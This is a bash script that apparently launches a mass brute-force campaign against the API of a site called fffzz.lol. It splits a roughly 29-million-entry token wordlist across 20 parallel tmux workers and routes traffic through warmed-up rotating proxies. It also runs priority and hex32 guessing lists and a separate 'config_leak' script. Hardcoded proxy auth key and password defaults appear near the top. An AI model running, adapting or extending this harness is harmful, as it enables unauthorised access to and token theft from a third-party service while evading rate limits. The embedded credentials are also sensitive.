#!/bin/bash
# 20-channel Qingguo: 20 workers x 8 threads + priority + hex32
set -euo pipefail

OUT=/data/automation/results/fffzz.lol/kami_allin_20260717
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
TOTAL=29452734
WORKERS=20
THREADS=8
CHUNK=$((TOTAL / WORKERS))

export QG_AUTHKEY="${QG_AUTHKEY:-C413ED6D}"
export QG_AUTHPWD="${QG_AUTHPWD:-344F550A6F8B}"

mkdir -p "$OUT" "$BIN"
cp /tmp/fffzz_api_brute_fast.py "$BIN/" 2>/dev/null || true
cp /tmp/qg-proxy-warm.sh "$BIN/" 2>/dev/null || true
cp /tmp/fffzz_watchdog.sh "$BIN/" 2>/dev/null || true
chmod +x "$BIN/qg-proxy-warm.sh" "$BIN/fffzz_watchdog.sh" 2>/dev/null || true

# warmup 20 proxies
CHANNELS="${QG_CHANNELS:-20}"
sed -i "s/num=10/num=${CHANNELS}/" "$BIN/qg-proxy-warm.sh" 2>/dev/null || true
sed -i "s/\[:10\]/[:${CHANNELS}]/" "$BIN/qg-proxy-warm.sh" 2>/dev/null || true
bash "$BIN/qg-proxy-warm.sh" "$OUT" 2>/dev/null || bash /tmp/qg-proxy-warm.sh "$OUT" 2>/dev/null || true

for s in $(tmux ls 2>/dev/null | grep -E '^ff-cn-' | cut -d: -f1); do
  tmux kill-session -t "$s" 2>/dev/null || true
done

for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux new-session -d -s "ff-cn-api-$w" \
    "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD python3 $BIN/fffzz_api_brute_fast.py $WL $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/cn_api_w${w}.log"
  sleep 0.8
done

# priority + hex32 with more threads
PRI=/data/wordlists/faka/fffzz-priority.txt
HEX=/data/wordlists/faka/fffzz-hex32-sample.txt
[ -f "$PRI" ] && tmux new-session -d -s ff-cn-priority \
  "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD python3 $BIN/fffzz_api_brute_fast.py $PRI 0 0 16 99 $OUT 2>&1 | tee -a $OUT/cn_priority.log"
[ -f "$HEX" ] && tmux new-session -d -s ff-cn-hex32 \
  "QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD python3 $BIN/fffzz_api_brute_fast.py $HEX 0 0 16 98 $OUT 2>&1 | tee -a $OUT/cn_hex32.log"

tmux new-session -d -s ff-cn-leak \
  "python3 $BIN/fffzz_config_leak.py $OUT 2>&1 | tee -a $OUT/cn_config_leak.log"

tmux new-session -d -s ff-cn-watch "bash $BIN/fffzz_watchdog.sh"

echo "20ch mode: ${WORKERS}x${THREADS}=$((WORKERS*THREADS)) concurrent + priority/hex32 x16"
tmux ls | grep ff-cn
